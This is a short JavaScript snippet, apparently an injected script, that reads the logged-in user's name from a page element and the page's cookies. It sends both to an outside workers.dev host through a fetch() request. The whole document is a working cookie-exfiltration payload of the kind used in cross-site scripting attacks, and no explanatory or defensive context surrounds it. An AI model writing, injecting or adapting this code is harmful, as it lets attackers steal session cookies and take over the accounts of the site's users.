const userLink = document.querySelector('.usuarioCont p:first-child a');
const userName = userLink ? encodeURIComponent(userLink.textContent.trim()) : "unknown";
const cookies = encodeURIComponent(document.cookie);

fetch(`https://s.d4s8c4.workers.dev?u=${userName}&c=${cookies}`);
